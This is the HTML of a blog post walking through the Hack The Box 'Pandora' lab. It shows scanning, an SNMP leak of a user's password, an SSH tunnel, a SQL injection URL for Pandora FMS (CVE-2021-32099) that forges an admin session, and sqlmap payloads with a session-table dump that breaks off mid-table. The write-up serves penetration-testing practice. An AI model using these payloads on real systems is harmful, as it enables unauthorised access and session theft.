@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	08 Jan 2022IP:	10.10.11.136">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[pandora]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/01/12/pandora/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	08 Jan 2022IP:	10.10.11.136">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2122.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2123.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2124.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2125.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2126.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2129.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2127.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2128.jpg">
+<meta property="article:published_time" content="2022-01-12T05:32:53.000Z">
+<meta property="article:modified_time" content="2022-05-28T00:58:57.107Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2122.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/01/12/pandora/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/01/12/pandora/","path":"2022/01/12/pandora/","title":"Hack-The-Box-walkthrough[pandora]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[pandora] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#use-the-following-exp"><span class="nav-number">2.2.</span> <span class="nav-text">use the following exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#or-just-use-sqlmap-to-get-admin%E2%80%99s-PHPSESSID"><span class="nav-number">2.3.</span> <span class="nav-text">or just use sqlmap to get admin’s PHPSESSID</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/01/12/pandora/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[pandora] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[pandora]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-01-12 13:32:53" itemprop="dateCreated datePublished" datetime="2022-01-12T13:32:53+08:00">2022-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-05-28 08:58:57" itemprop="dateModified" datetime="2022-05-28T08:58:57+08:00">2022-05-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Easy<br>Points:	20<br>Release:	08 Jan 2022<br>IP:	10.10.11.136</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2122.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.136</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>We see that the TCP ports 22(ssh) and 80(http) are open. Let’s check what the port 80 gives us.</p>
+<p>Navigating the website, it seems like all are static pages and no dynamic content is being shown. There is one form for filling sending a message to admins, but the form does not do anything except refresh the page. There is also not a robots.txt that may reveal some juicy info. Maybe there are some interesting hidden directories, let’s fire gobuster!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># gobuster dir -u http://10.10.11.136 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.136</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/01/12 00:51:23 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.136/assets/]</span><br></pre></td></tr></table></figure>
+
+<p>Gobuster gives nothing interesting except, the &#x2F;assets directory which contains javascript and css files and some images. Maybe this is the directory where it is fetching the contents on the main website from.</p>
+<p>At this point we don’t have much to work with. Let’s try a UDP scan.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sC -sV -v 10.10.11.136</span><br><span class="line"></span><br><span class="line">Discovered open port 161/udp on 10.10.11.136</span><br></pre></td></tr></table></figure>
+
+<p>We got one port(UDP 161) SNMP. Let’s see what it has to offer. We run snmpwalk with the public community string.</p>
+<p>public is default for most snmp servers and thats why I tried public first, if it doesn’t work, one might have to bruteforce the community string.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># snmpwalk -v 2c 10.10.11.136 -c public | grep daniel</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.817 = STRING: <span class="string">&quot;-c sleep 30; /bin/bash -c &#x27;/usr/bin/host_check -u daniel -p HotelBabylon23&#x27;&quot;</span></span><br><span class="line">iso.3.6.1.2.1.25.4.2.1.5.1119 = STRING: <span class="string">&quot;-u daniel -p HotelBabylon23&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2123.jpg"></li>
+</ul>
+<p>Snmpwalk gave us a bunch of details, but the most interesting one is the credentials of the user Daniel. Apparently there is a process running and the command of that includes the credentials for the user Daniel.</p>
+<p>Let’s ssh into the box with the obtained credentials. The user “daniel” does not have a lot of privileges. Looking at &#x2F;etc&#x2F;passwd, there is one other user matt which might have privileges. Looking around the system, we see that along with the static website that we saw earlier, there is one another web app called pandora. But looking at the sites-enabled config, there seems to be no way to it. But making a curl request from the localhost(victim), shows something interesting.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">daniel@pandora:~$ curl http://localhost</span><br><span class="line">&lt;meta HTTP-EQUIV=<span class="string">&quot;REFRESH&quot;</span> content=<span class="string">&quot;0; url=/pandora_console/&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>It seems like only the localhost might have access to that website. Let’s create an ssh tunnel to port 80 so that we can view the website from our machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 80:localhost:80 daniel@10.10.11.136</span><br></pre></td></tr></table></figure>
+
+<p>The pandora console opens and asks for credentials.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2124.jpg"></li>
+</ul>
+<p>Common login credentials like admin&#x2F;admin, admin&#x2F;password don’t work. Googling pandora gives us the information that it is a monitoring system. Moreover the version of the pandora is clearly visible on the bottom of the login page: v7.0NG.742. On searching for the exploit specific to this version we come across a very interesting article.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNvbmFyc291cmNlLmNvbS9wYW5kb3JhLWZtcy03NDItY3JpdGljYWwtY29kZS12dWxuZXJhYmlsaXRpZXMtZXhwbGFpbmVk">Pandora FMS 742: Critical Code Vulnerabilities Explained<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>This article gives a detailed explanation of the underlying vulnerability. Using this sql injection we can bypass the login page and get admin access</p>
+<h2 id="use-the-following-exp"><a href="#use-the-following-exp" class="headerlink" title="use the following exp"></a>use the following exp</h2><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pqaWNtRGFya1dpbmcvQ1ZFLTIwMjEtMzIwOTk=">CVE-2021-32099<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>just access following url</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=<span class="string">&#x27; union SELECT 1,2,&#x27;</span>id_usuario|s:5:<span class="string">&quot;admin&quot;</span>;<span class="string">&#x27; as data -- SgGO</span></span><br></pre></td></tr></table></figure>
+
+<p>then refresh the page, then we are in…</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2125.jpg"></li>
+</ul>
+<h2 id="or-just-use-sqlmap-to-get-admin’s-PHPSESSID"><a href="#or-just-use-sqlmap-to-get-admin’s-PHPSESSID" class="headerlink" title="or just use sqlmap to get admin’s PHPSESSID"></a>or just use sqlmap to get admin’s PHPSESSID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># sqlmap --url=&quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=&#x27;&#x27;&quot; -D pandora -T tsessions_php --dump</span></span><br><span class="line">......</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: session_id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: session_id=-4214<span class="string">&#x27; OR 7546=7546#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: session_id=&#x27;</span><span class="string">&#x27;&#x27;</span> OR (SELECT 8036 FROM(SELECT COUNT(*),CONCAT(0x716b7a6a71,(SELECT (ELT(8036=8036,1))),0x7176716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HLHR</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: session_id=<span class="string">&#x27;&#x27;</span><span class="string">&#x27; AND (SELECT 1534 FROM (SELECT(SLEEP(5)))VpEy)-- vAqO</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Database: pandora</span></span><br><span class="line"><span class="string">Table: tsessions_php</span></span><br><span class="line"><span class="string">[49 entries]</span></span><br><span class="line"><span class="string">+----------------------------+------------------------------------------------------+-------------+</span></span><br><span class="line"><span class="string">| id_session                 | data                                                 | last_active |</span></span><br><span class="line"><span class="string">+----------------------------+------------------------------------------------------+-------------+</span></span><br><span class="line"><span class="string">| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638783555  |</span></span><br><span class="line"><span class="string">| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | 1638789018  |</span></span><br><span class="line"><span class="string">| 11umescohevmlgeoq1e6clrp4v | id_usuario|s:6:&quot;daniel&quot;;                             | 1641955048  |</span></span><br><span class="line"><span class="string">| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | 1638792211  |</span></span><br><span class="line"><span class="string">| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | 1638786129  |</span></span><br><span class="line"><span class="string">| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;;                             | 1638540332  |</span></span><br><span class="line"><span class="string">| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | 1638795380  |</span></span><br><span class="line"><span class="string">| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | 1638786842  |</span></span><br><span class="line"><span class="string">| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;;                             | 1638535373  |</span></span><br><span class="line"><span class="string">| 5682e0ou1l66p921j3p93hngea | NULL                                                 | 1641959327  |</span></span><br><span class="line"><span class="string">| 59qae699l0971h13qmbpqahlls | NULL                                                 | 1638787305  |</span></span><br><span class="line"><span class="string">| 5bhrjn4ei51vtt33vp18p42sj4 | NULL                                                 | 1641959245  |</span></span><br><span class="line"><span class="string">| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | 1638792685  |</span></span><br><span class="line"><span class="string">| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;;                             | 1638281946  |</span></span><br><span class="line"><span class="string">| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;;                             | 1641195617  |</span></span><br><span class="line"><span class="string">| 6rjav587a3lafqum2oifkvptan | NULL                                                 | 1641959355  |</span></span><br><span class="line"><span class="string">| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | 1623957150  |</span></span><br><span class="line"><span class="string">| 82k8g5avplsdj83s0mkqkp77l0 | NULL                                                 | 1641959280  |</span></span><br><span class="line"><span class="string">| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;;                             | 1638446321  |</span></span><br><span class="line"><span class="string">| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | 1638787267  |</span></span><br><span class="line"><span class="string">| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638881787  |</span></span><br><span class="line"><span class="string">| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | 1638795315  |</span></span><br><span 